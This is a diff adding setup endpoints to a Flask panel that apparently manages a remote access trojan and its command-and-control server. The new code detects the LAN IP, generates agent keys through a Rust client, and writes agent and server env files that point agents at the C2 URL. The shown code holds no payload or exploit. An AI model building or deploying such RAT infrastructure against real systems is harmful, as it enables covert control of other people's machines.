@@ -1,5 +1,7 @@
 import os
 import base64
+import secrets
+import socket
 import subprocess
 import threading
 import urllib.request
@@ -16,6 +18,116 @@ C2_SERVER_URL = os.environ.get('C2_SERVER_URL', 'http://localhost:8080')
 server_process = None
 build_status = {"status": "idle", "output": "", "message": ""}
 build_thread = None
+
+# -------------------------------------------------------------------
+# Setup helpers
+# -------------------------------------------------------------------
+def _get_local_ip():
+    """Best-effort detection of the host's LAN IP."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def _read_env_file(path):
+    """Parse a simple KEY=VALUE env file, ignore comments."""
+    result = {}
+    if os.path.isfile(path):
+        with open(path) as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#') and '=' in line:
+                    k, v = line.split('=', 1)
+                    result[k.strip()] = v.strip()
+    return result
+
+
+@app.route('/api/setup/status', methods=['GET'])
+def setup_status():
+    """Return current config status so the UI can show what's already set up."""
+    agent_env = _read_env_file(os.path.join(RAT_DIR, 'agent.env'))
+    server_env = _read_env_file(os.path.join(RAT_DIR, '.env'))
+    return jsonify({
+        "local_ip": _get_local_ip(),
+        "agent_env_exists": bool(agent_env),
+        "server_env_exists": bool(server_env),
+        "server_url": agent_env.get('SERVER_URL', ''),
+        "has_keys": bool(agent_env.get('AGENT_IDENTITY_PRIVATE_KEY', '')),
+    })
+
+
+@app.route('/api/setup/init', methods=['POST'])
+def setup_init():
+    """
+    Automatically:
+      1. Run 'cargo run -p client -- identity' to generate Ed25519 keypair
+      2. Generate a random 32-byte prekey
+      3. Write agent.env and .env with all values filled in
+    Accepts optional JSON body: { "server_url": "http://IP:PORT" }
+    """
+    body = request.get_json(silent=True) or {}
+    local_ip = _get_local_ip()
+    server_url = body.get('server_url', f'http://{local_ip}:8080')
+
+    try:
+        # Step 1: generate Ed25519 identity keypair via the client binary
+        result = subprocess.run(
+            ['cargo', 'run', '-p', 'client', '--', 'identity'],
+            cwd=RAT_DIR,
+            capture_output=True, text=True, timeout=120
+        )
+        output = result.stdout + result.stderr
+        priv_key = ''
+        pub_key = ''
+        for line in output.splitlines():
+            if 'private key:' in line.lower():
+                priv_key = line.split(':', 1)[1].strip()
+            elif 'public key:' in line.lower():
+                pub_key = line.split(':', 1)[1].strip()
+
+        if not priv_key or not pub_key:
+            return jsonify({"status": "error", "message": f"Failed to parse keys from cargo output:\n{output}"}), 500
+
+        # Step 2: generate random prekey (32 bytes base64)
+        prekey = base64.b64encode(secrets.token_bytes(32)).decode('ascii')
+
+        # Step 3: write agent.env
+        agent_env_content = (
+            f"SERVER_URL={server_url}\n"
+            f"AGENT_IDENTITY_PRIVATE_KEY={priv_key}\n"
+            f"AGENT_PREKEY_PRIVATE_KEY={prekey}\n"
+            f"CLIENT_IDENTITY_PUBLIC_KEY={pub_key}\n"
+        )
+        with open(os.path.join(RAT_DIR, 'agent.env'), 'w') as f:
+            f.write(agent_env_content)
+
+        # Step 4: write server .env
+        server_env_content = (
+            f"DATABASE_URL=sqlite://db.sqlite\n"
+            f"PORT=8080\n"
+            f"CLIENT_IDENTITY_PUBLIC_KEY={pub_key}\n"
+        )
+        with open(os.path.join(RAT_DIR, '.env'), 'w') as f:
+            f.write(server_env_content)
+
+        return jsonify({
+            "status": "success",
+            "server_url": server_url,
+            "public_key": pub_key,
+            "message": "agent.env et .env créés avec succès !"
+        })
+
+    except subprocess.TimeoutExpired:
+        return jsonify({"status": "error", "message": "Timeout: cargo prend trop longtemps. Assure-toi que Rust est installé."}), 500
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
 
 @app.route('/')
 def index():
